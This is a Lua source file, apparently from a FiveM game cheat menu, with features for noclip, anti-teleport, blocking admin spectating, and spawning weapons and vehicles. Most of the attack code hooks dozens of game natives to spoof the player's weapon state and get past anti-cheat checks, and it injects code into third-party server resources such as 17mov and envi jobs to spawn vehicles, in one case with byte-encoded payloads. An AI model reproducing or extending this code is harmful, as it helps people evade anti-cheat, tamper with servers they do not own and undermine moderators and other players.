                        if bp.IsEntityAttachedToAnyObject(ped) or bp.IsEntityAttachedToAnyVehicle(ped) or bp.IsEntityAttachedToAnyPed(ped) or bp.IsEntityAttachedToAnyEntity(ped) then
                            bp.DetachEntity(ped, true, false)
                        end
                    end
                end
            end)
        else
            executeCode('any', [[
                _G.AntiAttach = true
                CreateThread(function()
                    while _G.AntiAttach do
                        Wait(350)
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            if IsEntityAttachedToAnyObject(ped) or IsEntityAttachedToAnyVehicle(ped) or IsEntityAttachedToAnyPed(ped) or IsEntityAttachedToAnyEntity(ped) then
                                DetachEntity(ped, true, false)
                            end
                        end
                    end
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.AntiAttach = false
        else
            executeCode('any', [[ _G.AntiAttach = false ]])
        end
    end
end

local function setAntiTeleport(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.AntiTeleport = true
            CreateThread(function()
                local ped = bp.PlayerPedId()
                local lastPos = bp.GetEntityCoords(ped)

                while _G.AntiTeleport do
                    ped = bp.PlayerPedId()
                    local currentPos = bp.GetEntityCoords(ped)
                    local dist = #(currentPos - lastPos)

                    local isDead = bp.IsEntityDead(ped)
                    local isFading = bp.IsScreenFadedOut() or bp.IsScreenFadingOut()
                    local inVehicle = bp.IsPedInAnyVehicle(ped, false)

                    if dist > 100.0 and not isDead and not isFading and not inVehicle then
                        bp.SetEntityCoordsNoOffset(ped, lastPos.x, lastPos.y, lastPos.z, false, false, false)
                        if sendSnackbarMessage then
                            sendSnackbarMessage('error', 'Blocked teleport attempt', true)
                        end
                    else
                        lastPos = currentPos
                    end

                    Wait(0)
                end
            end)
        else
            executeCode('any', [[
                _G.AntiTeleport = true
                CreateThread(function()
                    local ped = PlayerPedId()
                    local lastPos = GetEntityCoords(ped)

                    while _G.AntiTeleport do
                        ped = PlayerPedId()
                        local currentPos = GetEntityCoords(ped)
                        local dist = #(currentPos - lastPos)

                        local isDead = IsEntityDead(ped)
                        local isFading = IsScreenFadedOut() or IsScreenFadingOut()
                        local inVehicle = IsPedInAnyVehicle(ped, false)

                        if dist > 100.0 and not isDead and not isFading and not inVehicle then
                            SetEntityCoordsNoOffset(ped, lastPos.x, lastPos.y, lastPos.z, false, false, false)
                            if sendSnackbarMessage then
                                sendSnackbarMessage('error', 'Blocked teleport attempt', true)
                            end
                        else
                            lastPos = currentPos
                        end

                        Wait(0)
                    end
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.AntiTeleport = false
        else
            executeCode('any', [[ _G.AntiTeleport = false ]])
        end
    end
end

local function setBlockSpectate(checked)
    _G.__BlockSpectate = checked
    if checked then
        CreateThread(function()
            while _G.__BlockSpectate do
                local myPed = PlayerPedId()
                local myCoords = GetEntityCoords(myPed)
                for _, playerId in ipairs(GetActivePlayers() or {}) do
                    if playerId ~= PlayerId() then
                        local ped = GetPlayerPed(playerId)
                        local coords = GetEntityCoords(ped)
                        local dz = myCoords.z - coords.z
                        if dz > 10.0 then
                            local dx = myCoords.x - coords.x
                            local dy = myCoords.y - coords.y
                            if (dx * dx + dy * dy) <= (10.0 * 10.0) then
                                if not IsEntityVisible(ped) then
                                    CreateThread(function()
                                        local p = PlayerPedId()
                                        local c = GetEntityCoords(p)
                                        SetEntityCoords(p, c.x + 500.0, c.y + 500.0, c.z + 500.0, false, false, false,
                                            false)
                                        Wait(500)
                                        SetEntityCoords(p, c.x, c.y, c.z, false, false, false, false)
                                    end)
                                    showNotify("Spectate attempt blocked.", "error")
                                    break
                                end
                            end
                        end
                    end
                end
                Wait(350)
            end
        end)
    else
        _G.__BlockSpectate = false
    end
end

local function setNoclip(state, speed)
    speed = speed or 5.5
    _G.setNoclipAllow = true
    _G.setNoclipActive = state
    _G.setNoclipSpeed = speed

    local function getCamDirection()
        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
        local pitch = GetGameplayCamRelativePitch()
        local x = -math.sin(math.rad(heading)) * math.cos(math.rad(pitch))
        local y = math.cos(math.rad(heading)) * math.cos(math.rad(pitch))
        local z = math.sin(math.rad(pitch))
        return vector3(x, y, z)
    end

    if not _G.setNoclipThreads then
        _G.setNoclipThreads = true

        CreateThread(function()
            while _G.setNoclipAllow do
                Wait(0)
                if _G.setNoclipActive and _G.setNoclipAllow then
                    local setPed = PlayerPedId()
                    local pos = GetEntityCoords(setPed)
                    local move = vector3(0, 0, 0)
                    local camDir = getCamDirection()
                    local speedBase = _G.setNoclipSpeed or 5.5

                    if IsControlPressed(0, 32) then move = move + (camDir * speedBase) end
                    if IsControlPressed(0, 33) then move = move - (camDir * speedBase) end
                    if IsControlPressed(0, 34) then move = move + (vector3(-camDir.y, camDir.x, 0) * speedBase) end
                    if IsControlPressed(0, 35) then move = move + (vector3(camDir.y, -camDir.x, 0) * speedBase) end
                    if IsControlPressed(0, 46) then move = move + vector3(0, 0, -speedBase) end
                    if IsControlPressed(0, 44) then move = move + vector3(0, 0, speedBase) end
                    if IsControlPressed(0, 21) then move = move * 2.5 end

                    if #(move) > 0.01 then
                        local newPos = pos + (move * 0.1)
                        SetEntityCoordsNoOffset(setPed, newPos.x, newPos.y, newPos.z, true, true, true)
                    end

                    local camHeading = GetGameplayCamRelativeHeading() + GetEntityHeading(setPed)
                    SetEntityHeading(setPed, camHeading % 360)

                    FreezeEntityPosition(setPed, true)
                else
                    local setPed = PlayerPedId()
                    FreezeEntityPosition(setPed, false)
                end
            end
            _G.setNoclipThreads = false
        end)
    end
end

local function spawnWeaponByName(weaponName, ammoAmount)
    ammoAmount = ammoAmount or 255
    local ped = PlayerPedId()
    -- Native Hooks to spoof weapon state (returns unarmed to bypass checks)
    -- GetCurrentPedWeapon
    MachoHookNative(0x3A87E44BB9A01D54, function(p, p2)
        if p == PlayerPedId() then return false, false, -1569615261 end
    end)

    -- GetSelectedPedWeapon
    MachoHookNative(0x0A6DB4965674D243, function(p)
        if p == PlayerPedId() then return false, -1569615261 end
        return true
    end)

    -- GetBestPedWeapon
    MachoHookNative(0x8483E98E8B888AE2, function(p, p1)
        if p == PlayerPedId() then return false, -1569615261 end
        return true
    end)

    -- IsPedArmed
    MachoHookNative(0x475768A975D5AD17, function(p, typeFlags)
        if p == PlayerPedId() then return false, false end
    end)

    -- HasPedGotWeapon
    MachoHookNative(0x8DECB02F88F428BC, function(p, weaponHash, p2)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetAmmoInClip
    MachoHookNative(0x2E1202248937775C, function(p, weaponHash)
        if p == PlayerPedId() then return false, false, 0 end
        return true
    end)

    -- HudWeaponWheelGetSelectedHash
    MachoHookNative(0xA48931185F0536FE, function()
        return false, -1569615261
    end)

    -- GetLockonDistanceOfCurrentPedWeapon
    MachoHookNative(0x840F03E9041E2C9C, function(p)
        if p == PlayerPedId() then return false, 0.0 end
        return true
    end)

    -- GetPedConfigFlag (flag 331)
    MachoHookNative(0x7EE53118C892B513, function(p, flag, p2)
        if p == PlayerPedId() and flag == 331 then return false, false end
        return true
    end)

    -- RemoveWeaponFromPed - BLOCK IT
    MachoHookNative(0x4899CB088EDF59B8, function(p, weaponHash)
        if p == PlayerPedId() then return false end
        return true
    end)

    -- GetCurrentPedWeaponEntityIndex
    MachoHookNative(0x3B390A939AF0B5FC, function(p, p1)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetPedWeaponTintIndex
    MachoHookNative(0x2B9EEDC07BD06B9F, function(p, weaponHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetPedAmmoTypeFromWeapon
    MachoHookNative(0x7FEAD38B326B9F74, function(p, weaponHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetPedAmmoByType
    MachoHookNative(0x39D22031557946C1, function(p, ammoType)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetAmmoInPedWeapon
    MachoHookNative(0x015A522136D7F951, function(p, weaponHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetMaxAmmoInClip
    MachoHookNative(0xA38DCFFCEA8962FA, function(p, weaponHash, p2)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- GetMaxAmmo
    MachoHookNative(0xDC16122C7A20C933, function(p, weaponHash)
        if p == PlayerPedId() then return false, false, 0 end
        return true
    end)

    -- IsPedCurrentWeaponSilenced
    MachoHookNative(0x65F0C5AE05943EC7, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedWeaponReadyToShoot
    MachoHookNative(0xB80CA294F2F26749, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedShooting
    MachoHookNative(0x34616828CD07F1A1, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedDoingDriveby
    MachoHookNative(0xB2C086CC1BF8F2BF, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- IsPedReloading
    MachoHookNative(0x24B100C68C645951, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetPedWeaponComponentTintIndex
    MachoHookNative(0xF0A60040BE558F2D, function(p, weaponHash, componentHash)
        if p == PlayerPedId() then return false, 0 end
        return true
    end)

    -- HasPedGotWeaponComponent
    MachoHookNative(0xC593212475FAE340, function(p, weaponHash, componentHash)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetWeaponObjectFromPed
    MachoHookNative(0xCAE1DC9A0E22A16D, function(p, p1) return false, 0 end)

    -- GetWeaponClipSize
    MachoHookNative(0x583BE370B1EC6EB4, function(weaponHash) return false, 0 end)

    -- GetWeaponDamage
    MachoHookNative(0x3133B907D8B32053, function(weaponHash, componentHash) return false, 0.0 end)

    -- GetWeaponTimeBetweenShots
    MachoHookNative(0x065D2AACAD8CF7A4, function(weaponHash) return false, 0.0 end)

    -- GetWeaponDamageType
    MachoHookNative(0x3BE0BB12D25FB305, function(weaponHash) return false, 0 end)

    -- CanPedEquipWeapon
    MachoHookNative(0xB9A8252F8927A3B4, function(p, weaponHash)
        if p == PlayerPedId() then return false, true end
        return true
    end)

    -- GetPedDesiredMoveBlendRatio
    MachoHookNative(0x8C7D9D2A8D3DB1D2, function(p)
        if p == PlayerPedId() then return false, 0.0 end
        return true
    end)

    -- IsPedInMeleeCombat
    MachoHookNative(0x4E209B2C1EAD5159, function(p)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- GetMaxRangeOfCurrentPedWeapon
    MachoHookNative(0x814C9D19DFD69679, function(p)
        if p == PlayerPedId() then return false, 1.0 end
        return true
    end)

    -- GetPedWeapontypeInSlot
    MachoHookNative(0xEFFED78E9011134D, function(p, weaponSlot)
        if p == PlayerPedId() then return false, -1569615261 end
        return true
    end)

    -- IsPedShootingInArea
    MachoHookNative(0x7E9DFE24AC1E58EF, function(p, x1, y1, z1, x2, y2, z2, p7, p8)
        if p == PlayerPedId() then return false, false end
        return true
    end)

    -- HudWeaponWheelGetSlotHash
    MachoHookNative(0xA13E93403F26C812, function(weaponTypeIndex)
        return false, -1569615261
    end)

    -- IsHudComponentActive
    MachoHookNative(0xBC4C9EA5391ECC0D, function(id)
        if id == 2 or id == 19 or id == 20 then return false, false end
        return true
    end)

    -- GetEntityPlayerIsFreeAimingAt
    MachoHookNative(0x2975C866E6713290, function(player)
        if player == PlayerId() then return false, false, 0 end
        return true
    end)

    -- GetPedParachuteState
    MachoHookNative(0x79CFD9827CC979B6, function(p) return false, 1 end)

    -- Bypass Wrapper
    local M9 = setmetatable({}, {
        __index = function(_, key)
            local fn = _G[key]
            if type(fn) == "function" then
                return function(...) return fn(...) end
            else
                return fn
            end
        end
    })

    -- Create thread for async asset loading
    M9.CreateThread(function()
        M9.Wait(35)

        local hash = M9.GetHashKey(weaponName)

        M9.RequestWeaponAsset(hash, 31, 0)
        while not M9.HasWeaponAssetLoaded(hash) do
            M9.Wait(1)
        end

        local myPed = M9.PlayerPedId()
        M9.GiveDelayedWeaponToPed(myPed, hash, ammoAmount, true)
        M9.SetPedAmmo(myPed, hash, ammoAmount)
    end)
end

function spawnCustomVehicle(carModel)
    if not carModel or carModel == "" then
        showNotify("Vehicle", "Car model is empty.")
        return
    end

    local function tryInject17mov(resourceName, model)
        if GetResourceState(resourceName) == "started" then
            MachoInjectResource2(NewThreadNs, resourceName, string.format([[
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local spawnCoords = vector4(coords.x, coords.y, coords.z, heading)
                SpawnVehicle("%%s", spawnCoords, true)
            ]], model))
            return true
        end
        return false
    end

    local enviFallbackResources = {
        "envi-medic", "envi-hud", "envi-flamethrower",
        "envi-yoga", "envi-chopshop", "envi-chopshop-v2", "envi-foodtrucks", "envi-dumpsters",
        "envi-prescriptions", "envi-druglabs"
    }

    local function tryInjectEnvi(model)
        for _, res in ipairs(enviFallbackResources) do
            if GetResourceState(res) == "started" then
                local modelBytes = {}
                for i = 1, #model do modelBytes[i] = string.byte(model, i) end
                MachoInjectResource2(NewThreadNs, res, string.format([[
                    local function decode(tbl) local s = "" for i = 1, #tbl do s = s .. string.char(tbl[i]) end return s end
                    local model = decode({%%s}) local coords = GetEntityCoords(PlayerPedId()) Framework.SpawnVehicle(function(cb) end, model, coords, false)
                ]], table.concat(modelBytes, ",")))
                return true
            end
        end
        return false
    end

    local movResources = {
        "17mov_GarbageCollector", "17mov_Deliverer", "17mov_BuilderJob",
        "17mov_Electrician", "17mov_Postman", "17mov_Lumberjack", "17mov_TreasureHunter",
        "17mov_OilRig", "17mov_WindowCleaning", "17mov_GruppeSechs"
    }

    for _, res in ipairs(movResources) do
        if tryInject17mov(res, carModel) then return end
    end

    if tryInjectEnvi(carModel) then return end

    showNotify('No spawn resources found.', 'error')
end

local setClasses = {
    [0]  = { label = 'Compacts', models = {} },
    [1]  = { label = 'Sedans', models = {} },
    [2]  = { label = 'SUVs', models = {} },
    [3]  = { label = 'Coupes', models = {} },
    [4]  = { label = 'Muscle', models = {} },
    [5]  = { label = 'Sports Classics', models = {} },
    [6]  = { label = 'Sports', models = {} },
    [7]  = { label = 'Super', models = {} },
    [8]  = { label = 'Motorcycles', models = {} },
    [9]  = { label = 'Off-road', models = {} },
    [10] = { label = 'Industrial', models = {} },
    [11] = { label = 'Utility', models = {} },
    [12] = { label = 'Vans', models = {} },
    [13] = { label = 'Cycles', models = {} },
    [14] = { label = 'Boats', models = {} },
    [15] = { label = 'Helicopters', models = {} },
    [16] = { label = 'Planes', models = {} },
    [17] = { label = 'Service', models = {} },
    [18] = { label = 'Emergency', models = {} },
    [19] = { label = 'Military', models = {} },
    [20] = { label = 'Commercial', models = {} },
    [21] = { label = 'Trains', models = {} },
    [22] = { label = 'Open Wheel', models = {} },
}

do
    local gameModels = GetAllVehicleModels() or {}
    for i = 1, #gameModels do
        local model = gameModels[i]
        local setClass = GetVehicleClassFromName(model)
        if setClass and setClasses[setClass] then
            local t = setClasses[setClass].models
            t[#t + 1] = model
        end
    end
end

local vehicleClassScrollItems = {}
vehicleClassScrollItems[#vehicleClassScrollItems + 1] = {
    label = 'Custom Model',
    type = 'button',
    onConfirm = function(model)
        showInput("Enter Vehicle Model", "", function(model)
            if model and model ~= "" then
                spawnCustomVehicle(model)
            end
        end, "typeable")
    end
}
for i = 0, 22 do
    if setClasses[i] and #setClasses[i].models > 0 then
        local models = setClasses[i].models
        local options = {}
        for j = 1, #models do
            options[j] = { label = models[j], value = models[j] }
        end
        vehicleClassScrollItems[#vehicleClassScrollItems + 1] = {
            label = setClasses[i].label,
            type = 'scroll',
            selected = 1,
            options = options,
            onConfirm = function(state)
                if state and state.value and state.value ~= "" then
                    spawnCustomVehicle(state.value)
                end
            end
        }
    end
end

local weaponsScrollItems = { addonWeaponsScrollItem }

local weaponCategories = {
    { label = 'Melee',      default = 'WEAPON_UNARMED',      weapons = { "WEAPON_UNARMED", "WEAPON_DAGGER", "WEAPON_AXE", "WEAPON_BAT", "WEAPON_BOTTLE", "WEAPON_CROWBAR", "WEAPON_FLASHLIGHT", "WEAPON_GOLFCLUB", "WEAPON_HAMMER", "WEAPON_HATCHET", "WEAPON_KNUCKLE", "WEAPON_KNIFE", "WEAPON_MACHETE", "WEAPON_SWITCHBLADE", "WEAPON_NIGHTSTICK", "WEAPON_WRENCH", "WEAPON_BATTLEAXE", "WEAPON_POOL_CUE", "WEAPON_STONE_HATCHET" } },
    { label = 'Handguns',   default = 'WEAPON_PISTOL',       weapons = { "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_STUNGUN", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_SNSPISTOL_MK2", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_REVOLVER_MK2", "WEAPON_DOUBLEACTION", "WEAPON_RAYPISTOL", "WEAPON_CERAMICPISTOL", "WEAPON_NAVYREVOLVER", "WEAPON_GADGETPISTOL", "WEAPON_STUNGUN_MP" } },
    { label = 'SMGs',       default = 'WEAPON_MICROSMG',     weapons = { "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_COMBATPDW", "WEAPON_MACHINEPISTOL", "WEAPON_MINISMG", "WEAPON_RAYCARBINE" } },
    { label = 'Rifles',     default = 'WEAPON_ASSAULTRIFLE', weapons = { "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_SPECIALCARBINE_MK2", "WEAPON_BULLPUPRIFLE", "WEAPON_BULLPUPRIFLE_MK2", "WEAPON_COMPACTRIFLE", "WEAPON_MILITARYRIFLE", "WEAPON_HEAVYRIFLE", "WEAPON_TACTICALRIFLE", "WEAPON_STREETRIFLE" } },
    { label = 'Shotguns',   default = 'WEAPON_PUMPSHOTGUN',  weapons = { "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_AUTOSHOTGUN", "WEAPON_COMBATSHOTGUN" } },
    { label = 'Snipers',    default = 'WEAPON_SNIPERRIFLE',  weapons = { "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_MARKSMANRIFLE_MK2", "WEAPON_PRECISIONRIFLE" } },
    { label = 'Explosives', default = 'WEAPON_GRENADE',      weapons = { "WEAPON_GRENADE", "WEAPON_BZGAS", "WEAPON_MOLOTOV", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_SNOWBALL", "WEAPON_PIPEBOMB", "WEAPON_BALL", "WEAPON_SMOKEGRENADE", "WEAPON_FLARE", "WEAPON_ACIDPACKAGE", "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_COMPACTLAUNCHER", "WEAPON_EMPLAUNCHER" } },
    { label = 'Heavy',      default = 'WEAPON_MG',           weapons = { "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG", "WEAPON_MINIGUN", "WEAPON_RAILGUN", "WEAPON_RAYMINIGUN" } },
}

local nativeWeaponSet = {}
for i = 1, #nativeGtaWeapons do
    nativeWeaponSet[nativeGtaWeapons[i]:lower()] = true
end

local addonWeaponsScrollItem = {
    label = 'Addon',
    type = 'scroll',
    selected = 1,
    options = { { label = 'Loading...', value = '' } },
    onConfirm = function(state)
        if state and state.value and state.value ~= '' then
            spawnWeaponByName(state.value)
        end
    end
}

local nativeWeaponsScrollItems = {}
for i = 1, #nativeGtaWeapons do
    nativeWeaponsScrollItems[i] = {
        label = nativeGtaWeapons[i]:gsub("WEAPON_", ""):gsub("_", " "),
        value = nativeGtaWeapons[i]
    }
end

local weaponsSubmenuItems = {}

local oxStarted = GetResourceState('ox_inventory') == 'started'
if oxStarted then
    weaponsSubmenuItems[#weaponsSubmenuItems + 1] = addonWeaponsScrollItem
end

for _, cat in ipairs(weaponCategories) do
    local options = {}
    for i = 1, #cat.weapons do
        options[i] = {
            label = cat.weapons[i]:gsub('WEAPON_', ''):gsub('_', ' '),
            value = cat.weapons[i]
        }
    end
    weaponsSubmenuItems[#weaponsSubmenuItems + 1] = {
        label = cat.label,
        type = 'scroll',
        selected = 1,
        options = options,
        onConfirm = function(state)
            if state and state.value and state.value ~= '' then
                spawnWeaponByName(state.value)
            end
        end
    }
end

local ConfigUtils = {}
ConfigUtils.urlEncode = _G.urlEncode or function(str)
    if not str then return "" end
    str = string.gsub(str, "\n", "\r\n")
    str = string.gsub(str, "([^a-zA-Z0-9_.-])", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
    return str
end

ConfigUtils.getActiveCheckboxes = function(menuArray, list)
    if type(menuArray) ~= "table" then return end
    list = list or {}
    for i = 1, #menuArray do
        local itm = menuArray[i]
        local isCb = itm.type == "checkbox"
        if not isCb and type(itm.type) == "table" then
            for _, t in ipairs(itm.type) do
                if t == "checkbox" then
                    isCb = true
                    break
                end
            end
        end
        if isCb and itm.checked and type(itm.label) == "string" then
            list[#list + 1] = itm.label:lower():gsub("[^%w]", "")
        end
        if itm.submenu then ConfigUtils.getActiveCheckboxes(itm.submenu, list) end
        if itm.tabs then
            for t = 1, #itm.tabs do
                if itm.tabs[t].submenu then ConfigUtils.getActiveCheckboxes(itm.tabs[t].submenu, list) end
            end
        end
    end
    return list
end

ConfigUtils.applyCheckboxStates = function(menuArray, cbList)
    if type(menuArray) ~= "table" or type(cbList) ~= "table" then return end
    local dict = {}
    for _, lbl in ipairs(cbList) do if lbl ~= "" then dict[lbl] = true end end

    local function scan(arr)
        if type(arr) ~= "table" then return end
        for i = 1, #arr do
            local itm = arr[i]
            local isCb = itm.type == "checkbox"
            if not isCb and type(itm.type) == "table" then
                for _, t in ipairs(itm.type) do
                    if t == "checkbox" then
                        isCb = true
                        break
                    end
                end
            end
            if isCb then
                local safe = type(itm.label) == "string" and itm.label:lower():gsub("[^%w]", "") or ""
                if safe ~= "" then
                    local want = dict[safe] == true
                    if want and not itm.checked then
                        itm.checked = true
                        if type(itm.onConfirm) == "function" then itm.onConfirm(true) end
                    elseif not want and itm.checked then
                        itm.checked = false
                        if type(itm.onConfirm) == "function" then itm.onConfirm(false) end
                    end
                end
            end
            if itm.submenu then scan(itm.submenu) end
            if itm.tabs then
                for t = 1, #itm.tabs do
                    if itm.tabs[t].submenu then scan(itm.tabs[t].submenu) end
                end
            end
        end
    end
    scan(menuArray)
end

ConfigUtils.exportState = function(menuTree)
    local bp = {}
    for k, item in pairs(itemKeybinds) do
        if item.label then
            bp[#bp + 1] = k .. "-" .. item.label:lower():gsub("[^%w]", "")
        end
    end
    local bindStr = #bp > 0 and table.concat(bp, ".") or "x"

    local cbStr = "x"
    if menuTree then
        local cbs = ConfigUtils.getActiveCheckboxes(menuTree)
        if cbs and #cbs > 0 then cbStr = table.concat(cbs, ".") end
    end

    return menuPosX .. "_" .. menuPosY .. "_" .. menuScale .. "_" ..
        menuColorR .. "_" .. menuColorG .. "_" .. menuColorB .. "_" ..
        (showKeybindListState and "1" or "0") .. "_" ..
        bindStr .. "_" .. cbStr
end

ConfigUtils.scanAndBind = function(menuArray, key, targetL)
    if type(menuArray) ~= "table" then return false end
    local safeTarget = type(targetL) == "string" and targetL:lower():gsub("[^%w]", "") or ""
    for i = 1, #menuArray do
        local itm = menuArray[i]
        local safeLabel = type(itm.label) == "string" and itm.label:lower():gsub("[^%w]", "") or ""
        if safeLabel ~= "" and safeLabel == safeTarget then
            bindItemToKey(itm, key)
            return true
        end
        if itm.submenu and ConfigUtils.scanAndBind(itm.submenu, key, targetL) then return true end
        if itm.tabs then
            for t = 1, #itm.tabs do
                if itm.tabs[t].submenu and ConfigUtils.scanAndBind(itm.tabs[t].submenu, key, targetL) then return true end
            end
        end
    end
    return false
end

ConfigUtils.importState = function(rawData, menuTree)
    if type(rawData) ~= "string" or rawData == "" then return false end

    local fields = {}
    for f in (rawData .. "_"):gmatch("(.-)_") do fields[#fields + 1] = f end
    if #fields < 7 then return false end

    if fields[1] ~= "" then menuPosX = tonumber(fields[1]) or menuPosX end
    if fields[2] ~= "" then menuPosY = tonumber(fields[2]) or menuPosY end
    if fields[3] ~= "" then menuScale = tonumber(fields[3]) or menuScale end
    if fields[4] ~= "" then menuColorR = tonumber(fields[4]) or menuColorR end
    if fields[5] ~= "" then menuColorG = tonumber(fields[5]) or menuColorG end
    if fields[6] ~= "" then menuColorB = tonumber(fields[6]) or menuColorB end
    showKeybindListState = fields[7] == "1"

    SendSvelte('setMenuPos', { x = menuPosX, y = menuPosY })
    SendSvelte('setMenuScale', { scale = menuScale })
    SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
    SendSvelte('showKeybinds', { showKeybinds = showKeybindListState })

    for k, _ in pairs(itemKeybinds) do itemKeybinds[k] = nil end
    local bindStr = fields[8]
    if bindStr and bindStr ~= "x" and bindStr ~= "" then
        for pair in bindStr:gmatch("[^.]+") do
            local key, label = pair:match("^(.-)%-(.+)$")
            if key and label then ConfigUtils.scanAndBind(menuTree, key, label) end
        end
    end
    local newBinds = {}
    for k, v in pairs(itemKeybinds) do newBinds[#newBinds + 1] = { label = v.label or "?", key = k } end
    SendSvelte('updateKeybinds', { KeyBinds = newBinds })

    local cbStr = fields[9]
    if cbStr and cbStr ~= "x" and cbStr ~= "" then
        local cbList = {}
        for lbl in cbStr:gmatch("[^.]+") do cbList[#cbList + 1] = lbl end
        if #cbList > 0 then ConfigUtils.applyCheckboxStates(menuTree, cbList) end
    end

    return true
end
local vehicleClassScrollItems = {
    {
        label = "Sports",
        type = "scroll",
        icon = "ph ph-racing-helmet",
        desc = "Spawn a sports car",
        selected = 1,
        options = {
            { label = "Adder",        value = "adder" },
            { label = "Zentorno",     value = "zentorno" },
            { label = "T20",          value = "t20" },
            { label = "Osiris",       value = "osiris" },
            { label = "Entity XF",    value = "entityxf" },
            { label = "Turismo R",    value = "turismorx" },
            { label = "Banshee 900R", value = "banshee2" },
            { label = "Cheetah",      value = "cheetah" },
            { label = "Infernus",     value = "infernus" },
            { label = "Jester",       value = "jester" },
            { label = "Comet",        value = "comet2" },
            { label = "Sultan RS",    value = "sultanrs" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "Muscle",
        type = "scroll",
        icon = "ph ph-car",
        desc = "Spawn a muscle car",
        selected = 1,
        options = {
            { label = "Gauntlet",    value = "gauntlet" },
            { label = "Vigero",      value = "vigero" },
            { label = "Sabre Turbo", value = "sabre2" },
            { label = "Dominator",   value = "dominator" },
            { label = "Phoenix",     value = "phoenix" },
            { label = "Ruiner 2000", value = "ruiner2" },
            { label = "Blade",       value = "blade" },
            { label = "Stallion",    value = "stallion" },
            { label = "Dukes",       value = "dukes" },
            { label = "Buccaneer",   value = "buccaneer" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "SUVs",
        type = "scroll",
        icon = "ph ph-truck",
        desc = "Spawn an SUV",
        selected = 1,
        options = {
            { label = "Insurgent",  value = "insurgent" },
            { label = "Nightshark", value = "nightshark" },
            { label = "Dubsta",     value = "dubsta" },
            { label = "FQ2",        value = "fq2" },
            { label = "Gresley",    value = "gresley" },
            { label = "Cavalcade",  value = "cavalcade" },
            { label = "Baller",     value = "baller" },
            { label = "Granger",    value = "granger" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "Motorcycles",
        type = "scroll",
        icon = "ph ph-motorcycle",
        desc = "Spawn a motorcycle",
        selected = 1,
        options = {
            { label = "Bati 801",      value = "bati" },
            { label = "Akuma",         value = "akuma" },
            { label = "Hakuchou",      value = "hakuchou" },
            { label = "Shotaro",       value = "shotaro" },
            { label = "Gargoyle",      value = "gargoyle" },
            { label = "Oppressor Mk2", value = "oppressor2" },
            { label = "Lectro",        value = "lectro" },
            { label = "Dinka Thrust",  value = "thrust" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "Sedans",
        type = "scroll",
        icon = "ph ph-car-simple",
        desc = "Spawn a sedan",
        selected = 1,
        options = {
            { label = "Fugitive",     value = "fugitive" },
            { label = "Schafter V12", value = "schafter6" },
            { label = "Jackal",       value = "jackal" },
            { label = "Premier",      value = "premier" },
            { label = "Stanier",      value = "stanier" },
            { label = "Stretch",      value = "stretch" },
        },
        onConfirm = function(data)
            if data and data.value then spawnCustomVehicle(data.value) end
        end
    },
    {
        label = "Planes",
        type = "scroll",
        icon = "ph ph-airplane",
        desc = "Spawn a plane",
        selected = 1,
        options = {
            { label = "Hydra",        value = "hydra" },
            { label = "Lazer",        value = "lazer" },
            { label = "Luxor Deluxe", value = "luxor2" },
            { label = "Besra",        value = "besra" },
            { label = "Cuban 800",    value = "cuban800" },
            { label = "Titan",        value = "titan" },
